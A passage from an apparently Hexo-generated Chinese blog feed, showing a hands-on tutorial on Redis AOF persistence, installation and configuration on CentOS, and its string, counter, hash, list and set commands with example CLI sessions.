<h4 id="启用了AOF后"><a href="#启用了AOF后" class="headerlink" title="启用了AOF后"></a>启用了AOF后</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">给这个文件追加，把所有的命令都写到一个文件里面，你执行一个我写一个。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">恢复的话在执行一遍不就行了吗！非常简单 （但是恢复相对RDB模式回慢他相当于重新把AOF库里的记录重新往内存中写一边）</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">可以RDB和AOF同时使用！优点都占用了！但是也的根据业务来定！</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">开启方法：修改配置文件</span></span><br><span class="line">appendonly yes  #改为yes</span><br><span class="line">appendfilename "appendonly.aof"  #文件名</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">工作原理：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">forker 一个子进程写到临时文件，写完之后就给父进程发一个信号，开始写到写完的这个过程还会有子进程给父进程发信号。先保存在内存里</span></span><br><span class="line"><span class="meta">#</span><span class="bash">但是他有个好的功能，重写，他会定时对aof进行重新，这样文件就会非常小！</span></span><br><span class="line"> </span><br><span class="line">测试：（他会根据Redis可识别的方式写入文件，不过大概人也能看懂）</span><br><span class="line">[root@192.168.7.107]$ cat appendonly.aof</span><br><span class="line">*2</span><br><span class="line"><span class="meta">$</span><span class="bash">6</span></span><br><span class="line">SELECT</span><br><span class="line"><span class="meta">$</span><span class="bash">1</span></span><br><span class="line">0</span><br><span class="line">*3</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">SET</span><br><span class="line"><span class="meta">$</span><span class="bash">4</span></span><br><span class="line">kye1</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
        <category>NoSQL</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-cluster集群[一]:redis安装及redis数据类型</title>
    <url>/articles/88f598bf.html</url>
    <content><![CDATA[<h2 id="Redis介绍："><a href="#Redis介绍：" class="headerlink" title="Redis介绍："></a>Redis介绍：</h2><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h4><p>redis 是一个开源的、使用C语言编写的、支持网络交互的、可以基于内存也可以持久化的Key-Value数据库。</p>
<p>redis的源码非常简单，只要有时间看看谭浩强的C语言，在去看redis的源码能看懂50-60%。</p>
<p>redis目前最大的集群应该是新浪的应该。</p>
<p>redis目前是vmvaer来支持的，很多的开源软件都需要某些组织来支持的。如果一个开源软件没有金钱来支持的话很难走的持久</p>
<h4 id="Redis和Memcache对比"><a href="#Redis和Memcache对比" class="headerlink" title="Redis和Memcache对比"></a><strong>Redis和Memcache对比</strong></h4><p><img src="/articles/88f598bf/1.png" alt></p>
<p>持久化：以电商举例，session用memcache来做的，购物车用redis来做的，当你退出的时候会提示你购物车里的物品会在你退出后继续保存。相对来说memcache存储更单一化！</p>
<p>主从复制：redis的主从复制类似mysql的主从复制但是原理是不同的！</p>
<p>虚拟内存：说白了就是把内存里一些不用的东西放在硬盘上，最好不要用，降低效率，现在内存来说比较便宜。</p>
<a id="more"></a>

<h2 id="Redis安装-amp-基本操作："><a href="#Redis安装-amp-基本操作：" class="headerlink" title="Redis安装&amp;基本操作："></a>Redis安装&amp;基本操作：</h2><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h4><h6 id="检查配置环境"><a href="#检查配置环境" class="headerlink" title="检查配置环境"></a>检查配置环境</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">检查gcc是否安装，如果没有安装：</span></span><br><span class="line">yum -y install gcc</span><br></pre></td></tr></table></figure>

<h6 id="下载安装Redis"><a href="#下载安装Redis" class="headerlink" title="下载安装Redis"></a>下载安装Redis</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt/</span><br><span class="line">wget http://download.redis.io/releases/redis-3.0.4.tar.gz</span><br><span class="line"><span class="meta">#</span><span class="bash">这里下载可以登录官网查看最新的Redis</span></span><br><span class="line">tar -xvf redis-3.0.4.tar.gz</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">cd /opt/redis-3.0.4/src/</span><br><span class="line">make test</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">安装中可能遇到的问题：</span></span><br><span class="line">zmalloc.h:50:31: error: jemalloc/jemalloc.h: No such file or directory</span><br><span class="line">zmalloc.h:55:2: error: #error "Newer version of jemalloc required"</span><br><span class="line"> </span><br><span class="line">Allocator</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Selecting a non-default memory allocator when building Redis is done by setting</span><br><span class="line">the `MALLOC` environment variable. Redis is compiled and linked against libc</span><br><span class="line">malloc by default, with the exception of jemalloc being the default on Linux</span><br><span class="line">systems. This default was picked because jemalloc has proven to have fewer</span><br><span class="line">fragmentation problems than libc malloc.</span><br><span class="line">To force compiling against libc malloc, use:</span><br><span class="line"><span class="meta">%</span><span class="bash"> make MALLOC=libc</span></span><br><span class="line">To compile against jemalloc on Mac OS X systems, use:</span><br><span class="line"><span class="meta">%</span><span class="bash"> make MALLOC=jemalloc</span></span><br><span class="line"> </span><br><span class="line">allocator（分配算符），如果有MALLOC这个环境变量，会有用这个环境变量的 去建立Redis。</span><br><span class="line">而且libc 并不是默认的分配器，默认的是jemalloc！</span><br><span class="line">因为jemalloc被证明有更少的fragmentation problems比libc。</span><br><span class="line"> </span><br><span class="line">但是如果你又没有jemalloc 而只有 libc 当然 make 出错。 所以加这么一个参数。</span><br><span class="line">make MALLOC=libc</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<h6 id="配置redis"><a href="#配置redis" class="headerlink" title="配置redis"></a>配置redis</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">复制管理脚本</span></span><br><span class="line">cp /opt/redis-3.0.4/utils/redis_init_script /etc/init.d/redis   </span><br><span class="line">chmod +x /etc/init.d/redis</span><br><span class="line">mkdir /etc/redis</span><br><span class="line">cp /opt/redis-3.0.4/redis.conf /etc/redis/6379.conf</span><br></pre></td></tr></table></figure>

<h6 id="修改redis启动模式"><a href="#修改redis启动模式" class="headerlink" title="修改redis启动模式"></a>修改redis启动模式</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">默认Redis启动的时候是启动在前台的，把他改为启动在后台</span></span><br><span class="line">vim /etc/redis/6379.conf</span><br><span class="line">daemonize no  改为 daemonize yes</span><br></pre></td></tr></table></figure>

<h6 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">首先修改Redis启动脚本：</span></span><br><span class="line">vim /etc/init.d/redis</span><br><span class="line"><span class="meta">#</span><span class="bash">chkconfig: 35 95 95  在第三行加上即可</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">添加系统服务：</span></span><br><span class="line">chkconfig --add redis</span><br><span class="line"><span class="meta">#</span><span class="bash">设置开机启动：</span></span><br><span class="line">chkconfig redis on</span><br><span class="line"><span class="meta">#</span><span class="bash">检查服务状态：</span></span><br><span class="line">chkconfig --list redis</span><br></pre></td></tr></table></figure>

<h6 id="指定日志存放位置-amp-PID文件-amp-数据库文件存放位置（下一边写持久化）"><a href="#指定日志存放位置-amp-PID文件-amp-数据库文件存放位置（下一边写持久化）" class="headerlink" title="指定日志存放位置&amp;PID文件&amp;数据库文件存放位置（下一边写持久化）"></a>指定日志存放位置&amp;PID文件&amp;数据库文件存放位置（下一边写持久化）</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/redis/6379.conf</span><br><span class="line"> </span><br><span class="line">logfile "/var/log/redis.log"  #指定日志文件如果不指定就会在控制台输出</span><br><span class="line">pidfile /var/run/redis_6379.pid</span><br><span class="line">dir ./   #这个是指默认的持久化配置文件放在那里！建议修改下！</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">pidfile如果不修改使用默认的话就会报错：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">原因是在/etc/init.d/redis里指定的默认PID是：PIDFILE=/var/run/redis_<span class="variable">$&#123;REDISPORT&#125;</span>.pid </span></span><br><span class="line"><span class="meta">#</span><span class="bash">但是默认配置文件：/etc/redis/6379.conf（咱们自己从解压包里复制的里的默认是：pidfile /var/run/redis.pid）</span></span><br></pre></td></tr></table></figure>



<h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a><strong>基本操作</strong></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SET 设置Key</span><br><span class="line">GET 判断Key的值</span><br><span class="line">EXISTS 判断Key是否存在</span><br><span class="line">KEYS * 显示所有的Key</span><br><span class="line">DEL 删除指定Key</span><br><span class="line">TYPE 获取Key类型</span><br></pre></td></tr></table></figure>

<p><strong>注：Redis是不区分大小写的，命令最好使用大写这样能区分是命令还是参数！</strong></p>
<h6 id="set的例子："><a href="#set的例子：" class="headerlink" title="set的例子："></a>set的例子：</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.0.201:6379&gt; SET hello hehe</span><br><span class="line">OK</span><br><span class="line">192.168.0.201:6379&gt; GET hello</span><br><span class="line">"hehe"</span><br></pre></td></tr></table></figure>

<h6 id="设置多个key-value-然后使用使用keys-去查看所有"><a href="#设置多个key-value-然后使用使用keys-去查看所有" class="headerlink" title="设置多个key value 然后使用使用keys * 去查看所有"></a>设置多个key value 然后使用使用keys * 去查看所有</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.0.201:6379&gt; SET hello1 hehe1</span><br><span class="line">OK</span><br><span class="line">192.168.0.201:6379&gt; SET hello2 hehe2</span><br><span class="line">OK</span><br><span class="line"> </span><br><span class="line">192.168.0.201:6379&gt; KEYS  *</span><br><span class="line">1) "hello1"</span><br><span class="line">2) "hello"</span><br><span class="line">3) "hello2"</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">KEY匹配方式：</span></span><br><span class="line">？匹配单个</span><br><span class="line"> *匹配所有</span><br></pre></td></tr></table></figure>

<h6 id="判断key是否存在"><a href="#判断key是否存在" class="headerlink" title="判断key是否存在"></a>判断key是否存在</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">判断Key是否存在使用：EXISTS   他返回的是整形：0不存在，1存在</span></span><br><span class="line">192.168.0.201:6379&gt; EXISTS hello</span><br><span class="line">(integer) 1</span><br><span class="line">192.168.0.201:6379&gt; EXISTS hehe</span><br><span class="line">(integer) 0</span><br></pre></td></tr></table></figure>

<h6 id="删除KEY"><a href="#删除KEY" class="headerlink" title="删除KEY"></a>删除KEY</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.0.201:6379&gt; DEL hello</span><br><span class="line">(integer) 1   #这里的1是数量</span><br><span class="line"><span class="meta">#</span><span class="bash">删除多个测试下：</span></span><br><span class="line">192.168.0.201:6379&gt; DEL hello1 hello2</span><br><span class="line">(integer) 2</span><br></pre></td></tr></table></figure>

<h6 id="查看类型TYPE"><a href="#查看类型TYPE" class="headerlink" title="查看类型TYPE"></a>查看类型TYPE</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">只要用<span class="built_in">set</span>类型就是字符串。查看类型命令用TYPE</span></span><br><span class="line">192.168.0.201:6379&gt; TYPE hello</span><br><span class="line">string</span><br></pre></td></tr></table></figure>

<h6 id="Keyspace"><a href="#Keyspace" class="headerlink" title="Keyspace"></a>Keyspace</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">redis是支持多个实例的默认最多16个，可以修改配置文件来支持更多！</span></span><br><span class="line"><span class="meta">#</span><span class="bash">使用INFO命令查看！</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Keyspace</span></span><br><span class="line">db0:keys=1,expires=0,avg_ttl=0</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">db0 ：这个可以理解为命名空间。最多支持16个，使用SELECT 去切换</span></span><br><span class="line">192.168.0.201:6379&gt; SELECT 1</span><br><span class="line">OK</span><br><span class="line"><span class="meta">#</span><span class="bash">尝试添加一个key-value</span></span><br><span class="line">SET db1 hehe</span><br><span class="line"><span class="meta">#</span><span class="bash">然后在使用INFO看下</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Keyspace</span></span><br><span class="line">db0:keys=1,expires=0,avg_ttl=0</span><br><span class="line">db1:keys=1,expires=0,avg_ttl=0</span><br></pre></td></tr></table></figure>

<h2 id="Redis数据类型："><a href="#Redis数据类型：" class="headerlink" title="Redis数据类型："></a>Redis数据类型：</h2><p>他用不同的命令来区分你要操作什么数据类型<br>类型不能嵌套，不能混！ 但是有个王炸：set能把所有的类型都改为字符串类型！</p>
<h4 id="字符串类型："><a href="#字符串类型：" class="headerlink" title="字符串类型："></a>字符串类型：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SET</span><br><span class="line">GET</span><br><span class="line">DEL</span><br><span class="line">APPEND  在值的后面追加</span><br><span class="line">set能重新设置但是要追加的话使用APPEND最好比如</span><br><span class="line">192.168.0.201:6379&gt; SET hehe hello</span><br><span class="line">OK</span><br><span class="line">192.168.0.201:6379&gt; GET hehe</span><br><span class="line">"hello"</span><br><span class="line">192.168.0.201:6379&gt; APPEND hehe ,world</span><br><span class="line">(integer) 11</span><br><span class="line">192.168.0.201:6379&gt; GET hehe</span><br><span class="line">"hello,world"</span><br><span class="line"> </span><br><span class="line">可以同时设置多个值和查询值用MSET 和MSET</span><br><span class="line">192.168.0.201:6379&gt; MSET key1 v1 key2 v2 key3 v3</span><br><span class="line">OK</span><br><span class="line">192.168.0.201:6379&gt; MGET key1 key2 key3</span><br><span class="line">1) "v1"</span><br><span class="line">2) "v2"</span><br><span class="line">3) "v3"</span><br><span class="line"> </span><br><span class="line">获取字符串长度</span><br><span class="line">192.168.0.201:6379&gt; STRLEN hehe</span><br><span class="line">(integer) 11</span><br><span class="line">如果字符串是中文的他会按照UTF-8格式的来输出1个字等3个字符串来算的  )</span><br><span class="line">192.168.0.201:6379&gt; SET key "呵呵"</span><br><span class="line">OK</span><br><span class="line">192.168.0.201:6379&gt; GET key</span><br><span class="line">"\xe5\x91\xb5\xe5\x91\xb5"</span><br></pre></td></tr></table></figure>

<h4 id="自增类型"><a href="#自增类型" class="headerlink" title="自增类型"></a>自增类型</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">比如说投票点下+1 ，如果说用<span class="built_in">set</span>每点一次修改<span class="built_in">set</span>下那就不太现实。所有redis有个自增类型：INCR</span></span><br><span class="line">192.168.0.201:6379&gt; INCR num           #默认如果没有这个值的话，INCR就会自动创建一个值默认为零，当你没执行一次他就会+1</span><br><span class="line">(integer) 1</span><br><span class="line">192.168.0.201:6379&gt; INCR num</span><br><span class="line">(integer) 2</span><br><span class="line">192.168.0.201:6379&gt; INCR num</span><br><span class="line">(integer) 3</span><br><span class="line">192.168.0.201:6379&gt; INCR num</span><br><span class="line">(integer) 4</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">如果想加多个呢：INCRBY</span></span><br><span class="line">192.168.0.201:6379&gt; INCRBY num 10</span><br><span class="line">(integer) 57</span><br><span class="line">192.168.0.201:6379&gt; INCRBY num 10</span><br><span class="line">(integer) 67</span><br><span class="line">192.168.0.201:6379&gt; INCRBY num 10</span><br><span class="line">(integer) 77</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">减呢？ DECR</span></span><br><span class="line">192.168.0.201:6379&gt; DECR num</span><br><span class="line">(integer) 106</span><br><span class="line">192.168.0.201:6379&gt; DECR num</span><br><span class="line">(integer) 105</span><br><span class="line">192.168.0.201:6379&gt; DECR num</span><br><span class="line">(integer) 104</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">如果要是减多个呢：DECRBY</span></span><br><span class="line">192.168.0.201:6379&gt; DECRBY num 5</span><br><span class="line">(integer) 97</span><br><span class="line">192.168.0.201:6379&gt; DECRBY num 5</span><br><span class="line">(integer) 92</span><br><span class="line">192.168.0.201:6379&gt; DECRBY num 5</span><br><span class="line">(integer) 87</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">想支持小数点：</span></span><br><span class="line">INCRBYFLOAT key 0.1</span><br><span class="line">192.168.0.201:6379&gt; INCRBYFLOAT key 0.1</span><br><span class="line">"0.1"</span><br><span class="line">192.168.0.201:6379&gt; INCRBYFLOAT key 0.1</span><br><span class="line">"0.2"</span><br><span class="line">192.168.0.201:6379&gt; INCRBYFLOAT key 0.1</span><br><span class="line">"0.3"</span><br><span class="line">192.168.0.201:6379&gt; INCRBYFLOAT key 0.1</span><br><span class="line">"0.4"</span><br></pre></td></tr></table></figure>

<h4 id="散列类型（hash）"><a href="#散列类型（hash）" class="headerlink" title="散列类型（hash）"></a>散列类型（hash）</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">和数据库存的表似的，表不是的有字段吧，可以给每个字段设置个值</span></span><br><span class="line">HSET Key field value</span><br><span class="line">HGET Key field</span><br><span class="line">HMSET Key field value [field value....]</span><br><span class="line">HMGET Key field [field ...]</span><br><span class="line">HGETALL Key</span><br><span class="line">HDEL</span><br><span class="line"> </span><br><span class="line">192.168.0.201:6379&gt; HSET shouji name iphone</span><br><span class="line">(integer) 1</span><br><span class="line">192.168.0.201:6379&gt; HSET shouji co red</span><br><span class="line">(integer) 1</span><br><span class="line">192.168.0.201:6379&gt; HSET shouji price 8888</span><br><span class="line">(integer) 1</span><br><span class="line"> </span><br><span class="line">192.168.0.201:6379&gt; HGET shouji name</span><br><span class="line">"iphone"</span><br><span class="line">192.168.0.201:6379&gt; HGET shouji co</span><br><span class="line">"red"</span><br><span class="line">192.168.0.201:6379&gt; HGET shouji price</span><br><span class="line">"8888"</span><br><span class="line">192.168.0.201:6379&gt; HGETALL shouji</span><br><span class="line">1) "name"</span><br><span class="line">2) "iphone"</span><br><span class="line">3) "co"</span><br><span class="line">4) "red"</span><br><span class="line">5) "price"</span><br><span class="line">6) "8888"</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">其实现在看着不是好看的但是他通过一些API调用到网页上，通过排版取出来的值就好看了</span></span><br><span class="line">192.168.0.201:6379&gt; HMSET diannao name thinkpad co black price 30</span><br><span class="line">OK</span><br><span class="line">192.168.0.201:6379&gt; HMGET diannao name co price</span><br><span class="line">1) "thinkpad"</span><br><span class="line">2) "black"</span><br><span class="line">3) "30"</span><br></pre></td></tr></table></figure>

<h4 id="列表类型"><a href="#列表类型" class="headerlink" title="列表类型"></a>列表类型</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">列表类型：他是存储一个有序的字符串列表   这个“有序”是什么时候进来的！</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">列表你向左边添加和右边添加他的时间复杂度是一样的！O1（时间复杂度）</span></span><br><span class="line"><span class="meta">#</span><span class="bash">可以理解为：我这个速度不随着数量的增加而增加！比如1000行和1万行他的时间开销是一样的！    大学数据结构里学的</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">时间复杂度：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">同一问题可用不同算法解决，而一个算法的质量优劣将影响到算法乃至程序的效率。算法分析的目的在于选择合适算法和改进算法。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">计算机科学中，算法的时间复杂度是一个函数，它定量描述了该算法的运行时间。</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">但是他有个缺点，比如说里面有1万个key你想找到第98个这就费老劲了他从1开始数数到98</span></span><br><span class="line"><span class="meta">#</span><span class="bash">优点，你读前100个，卡直接读头部就非常快了</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">命令：</span></span><br><span class="line">LPUSH key value [value ...]</span><br><span class="line">RPUSH key value [value ...]</span><br><span class="line">               LPOP key</span><br><span class="line">               RPOP key</span><br><span class="line">     LRANGE key start stop</span><br><span class="line">     LREM key count value</span><br><span class="line"><span class="meta">#</span><span class="bash">从左边添加key</span></span><br><span class="line">192.168.0.201:6379&gt; LPUSH num 0</span><br><span class="line">(integer) 1</span><br><span class="line">192.168.0.201:6379&gt; LPUSH num 1</span><br><span class="line">(integer) 2</span><br><span class="line">192.168.0.201:6379&gt; LPUSH num 2</span><br><span class="line">(integer) 3</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">现在是从左边加</span></span><br><span class="line">2  1   0</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">从右边开始加</span></span><br><span class="line">192.168.0.201:6379&gt; RPUSH num 3</span><br><span class="line">(integer) 4</span><br><span class="line">2  1   0  3</span><br><span class="line"> </span><br><span class="line">192.168.0.201:6379&gt; RPUSH num 5</span><br><span class="line">(integer) 5</span><br><span class="line"> </span><br><span class="line">2  1  0  3  5  5</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">如果想获取长度就使用LNE 吗！获取列表类型长度就是：LLEN</span></span><br><span class="line">192.168.0.201:6379&gt; LLEN num</span><br><span class="line">(integer) 5</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">从左边拿key</span></span><br><span class="line"><span class="meta">#</span><span class="bash">从列表类型里拿出这个key来（拿出来就没有了），从左边拿左边第一个</span></span><br><span class="line">192.168.0.201:6379&gt; LPOP num</span><br><span class="line">"2"</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">左边第一个是2那么拿出来之后这个key这个key就变成</span></span><br><span class="line">1  0  3  5</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">从右边拿key，从右边拿右边第一个   （这个5就被拿出来了）</span></span><br><span class="line">192.168.0.201:6379&gt; RPOP num</span><br><span class="line">"5"</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">现在在看下这个key的长度</span></span><br><span class="line">192.168.0.201:6379&gt; LLEN num</span><br><span class="line">(integer) 3</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">获取列表的某一个范围：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">现在是这个值</span></span><br><span class="line">1  0  3</span><br><span class="line"> </span><br><span class="line">192.168.0.201:6379&gt; LRANGE num 0 1              #取0 - 1 的值</span><br><span class="line">1) "1"</span><br><span class="line">2) "0"</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##这个列表和python中列表中差不多，0 -1 相当于列表中的下标。</span></span></span><br><span class="line"> </span><br><span class="line">192.168.0.201:6379&gt; LPUSH num 2</span><br><span class="line">(integer) 4</span><br><span class="line">192.168.0.201:6379&gt; RPUSH num 4</span><br><span class="line">(integer) 5</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">192.168.0.201:6379&gt; LRANGE num 0 -1     #这里的（-1）表示左边第一个</span><br><span class="line">1) "2"</span><br><span class="line">2) "1"</span><br><span class="line">3) "0"</span><br><span class="line">4) "3"</span><br><span class="line">5) "4"</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">获取指定元素的值</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">获取右边的第一个值：</span></span><br><span class="line">192.168.0.201:6379&gt; LINDEX num -1</span><br><span class="line">"4"</span><br><span class="line"><span class="meta">#</span><span class="bash">获取左边边的第二个值：</span></span><br><span class="line">192.168.0.201:6379&gt; LINDEX num -2</span><br><span class="line">"3"</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">那-3呢？</span></span><br><span class="line">192.168.0.201:6379&gt; LINDEX num -3</span><br><span class="line">"0"</span><br><span class="line"><span class="meta">#</span><span class="bash">这个就是从右边数的第3个值！！！！！</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">从左边获取值</span></span><br><span class="line">192.168.0.201:6379&gt; LINDEX num 0</span><br><span class="line">"2"</span><br><span class="line">192.168.0.201:6379&gt; LINDEX num 1</span><br><span class="line">"1"</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">他是两边的第一次接触有点乱！他是两边的需要注意！！！</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">只保留指定数据</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">只保留0到2的数据</span></span><br><span class="line">192.168.0.201:6379&gt; LTRIM num 0 2</span><br><span class="line">OK</span><br><span class="line"><span class="meta">#</span><span class="bash">看下结果：</span></span><br><span class="line">192.168.0.201:6379&gt; LRANGE num 0 -1</span><br><span class="line">1) "2"</span><br><span class="line">2) "1"</span><br><span class="line">3) "0"</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">这个有什么用呢：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">写日志的时候，我这个缓冲区，只保留最近100条日志！</span></span><br><span class="line"><span class="meta">#</span><span class="bash">比如：</span></span><br><span class="line">192.168.0.201:6379&gt; LPUSH logs newloghehe</span><br><span class="line">(integer) 1</span><br><span class="line"> </span><br><span class="line">192.168.0.201:6379&gt; LTRIM num 0 99</span><br><span class="line">OK</span><br><span class="line"> </span><br><span class="line">这样的话我的列表永远只有100条，我只看最近100条的日志！！</span><br></pre></td></tr></table></figure>

<h4 id="集合类型"><a href="#集合类型" class="headerlink" title="集合类型"></a>集合类型</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">集合是高一学的，第一个学期就是学的集合</span></span><br><span class="line"><span class="meta">#</span><span class="bash">交集∩、并集∪、合集、等 0 0 ！</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">集合的元素是没有类型的！</span></span><br><span class="line"><span class="meta">#</span><span class="bash">用到集合类型的应用有：（新浪微博分享了很多的redis应用）</span></span><br><span class="line"><span class="meta">#</span><span class="bash">比如：关注微博，比如咱俩是否共同关注了某一个人等。</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">添加集合</span></span><br><span class="line">192.168.0.201:6379&gt; SADD jihe1 a b c</span><br><span class="line">(integer) 3</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">查看集合内容</span></span><br><span class="line">192.168.0.201:6379&gt; SMEMBERS jihe1</span><br><span class="line">1) "c"</span><br><span class="line">2) "a"</span><br><span class="line">3) "b"</span><br><span class="line"><span class="meta">#</span><span class="bash">判断集合元素是否存在</span></span><br><span class="line">192.168.0.201:6379&gt; SISMEMBER jihe1 d</span><br><span class="line">(integer) 0</span><br><span class="line">192.168.0.201:6379&gt; SISMEMBER jihe1 a</span><br><span class="line">(integer) 1</span><br><span class="line">返回0 说明不存在返回1说明存存在</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">集合间运算</span></span><br><span class="line"><span class="meta">#</span><span class="bash">支持：交集、差集、并集</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">差集运算：</span></span><br><span class="line">192.168.0.201:6379&gt; SDIFF jihe1 jihe2</span><br><span class="line">1) "a"</span><br><span class="line">jihe1abcjihe2b cd</span><br><span class="line"> </span><br><span class="line">jihe1 减去jihe2 减去相同的b c  ,  jihe1 还剩下a</span><br><span class="line"> </span><br><span class="line">同理：</span><br><span class="line">jihe2 减去jihe1</span><br><span class="line">192.168.0.201:6379&gt; SDIFF jihe2 jihe1</span><br><span class="line">1) "d"</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">差集运算可以设置多个</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">交集运算：</span></span><br><span class="line"> 192.168.0.201:6379&gt; SINTER jihe1 jihe2</span><br><span class="line">1) "c"</span><br><span class="line">2) "b"</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">交集可以设置多个：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">在添加一个jihe3</span></span><br><span class="line">192.168.0.201:6379&gt; SADD jihe3 d e f</span><br><span class="line">(integer) 3</span><br><span class="line"> </span><br><span class="line">192.168.0.201:6379&gt; SINTER jihe1 jihe2 jihe3</span><br><span class="line">(empty list or set)</span><br><span class="line"><span class="meta">#</span><span class="bash">这个是因为他是jihe1和jihe2先做交集运算，然后在和jihe3做交集运算</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">并集运算</span></span><br><span class="line">192.168.0.201:6379&gt; SUNION jihe1 jihe2</span><br><span class="line">1) "a"</span><br><span class="line">2) "c"</span><br><span class="line">3) "b"</span><br><span class="line">4) "d"</span><br><span class="line"><span class="meta">#</span><span class="bash">同样也可以设置多个</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">以上的集合是无序的，redis支持有序的集合他的名如下</span></span><br><span class="line">ZADD key score member 增加元素</span><br><span class="line">ZSCORE key member 获取元素的分数</span><br><span class="line">ZRANGE key start stop [WITHSCORES]</span><br><span class="line">ZRANGEBYSCORE key min max</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">添加有序集合</span></span><br><span 